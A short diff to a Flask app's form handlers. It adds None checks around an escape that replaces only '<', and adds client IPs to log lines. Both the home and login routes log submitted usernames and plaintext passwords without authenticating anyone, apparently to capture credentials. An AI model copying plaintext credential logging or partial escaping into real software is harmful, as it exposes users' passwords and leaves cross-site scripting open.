@@ -9,11 +9,13 @@ def home():
     username,password = "", ""
     if request.method == 'POST':
         username = request.form.get('username')
-        password = request.form.get('password')
+        password = request.form.get('password') 
         user_ip = request.remote_addr
         logging.info(f"IP: {user_ip}, Username: {username}, Password: {password}")
-        username = username.replace('<','&lt;')
-        password = password.replace('<','&lt;')
+        if username is not None:
+            username = username.replace('<','&lt;')
+        if password is not None:
+            password = password.replace('<','&lt;')
         return render_template('main.html',user=username)
     return render_template('main.html')
 
@@ -72,7 +74,8 @@ def login():
     if request.method == 'POST':
         username = request.form.get('username')
         password = request.form.get('password')
-        logging.info(f"Username: {username}, Password: {password}")
+        user_ip = request.remote_addr
+        logging.info(f"IP: {user_ip}, Username: {username}, Password: {password}")
         return redirect('/')
     return render_template('login.html')
 
